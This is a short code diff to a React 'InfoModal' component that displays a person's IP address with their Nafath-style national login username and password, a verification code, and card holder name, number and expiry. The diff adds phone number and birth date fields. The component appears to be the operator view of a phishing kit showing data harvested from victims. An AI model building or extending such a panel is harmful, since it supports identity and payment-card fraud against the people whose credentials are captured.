@@ -22,6 +22,8 @@ export default function InfoModal({ ip, user, onClose }) {
         ["Nafad User", user.username],
         ["Nafad Pass", user.password],
         ["Basmah", user.code],
+        ["phoneNumber", user.phoneNumber],
+        ["birthDate", user.birthDate],
         ["Card Holder", user.cardHolderName],
         ["Card #", user.cardNumber],
         ["Expiry", user.expirationDate],
